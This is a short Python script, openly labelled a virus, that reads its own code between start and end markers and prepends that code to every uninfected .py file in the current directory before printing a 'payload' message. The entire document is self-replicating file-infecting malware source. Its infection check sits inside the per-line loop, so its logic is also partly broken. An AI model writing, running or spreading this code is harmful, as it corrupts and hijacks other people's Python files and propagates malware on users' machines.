## START OF VIRUS ##
import sys
import glob
code = []
with open(sys.argv[0], 'r')as f:  # current file open method in read mode f: is file obj

    lines = f.readlines()  # copy

virus_area = False  # specific Area define

for line in lines:

    if line == "## START OF VIRUS ##\n":  # starting point

        virus_area = True

    if virus_area:

        code.append(line)  # if true so append in the code list

    if line == "## END OF VIRUS ##":  # Ending point

        break

python_files = glob.glob('*.py')  # targetd file type define

print("this Files are Infected:", python_files)

for file in python_files:

    with open(file, 'r') as f:  # files open in read mode

        script_code = f.readlines()

    infected = False

    for line in script_code:

        if line == "## START OF VIRUS ##\n":

            infected = True

            break

        if not infected:  # its meas false condition

            final_code = []

            # final code me add kr dya he jo bi code file me tha (Override nhn kra he )
            final_code.extend(code)

            final_code.extend('\n')

            # final code me script code ko add kr dya he
            final_code.extend(script_code)

            with open(file, 'w') as f:

                f.writelines(final_code)  # targed file me send kr dya he

# Payload
print("Welcome to the VIRUS !!!")

print(" main virus file")

## END OF VIRUS ##
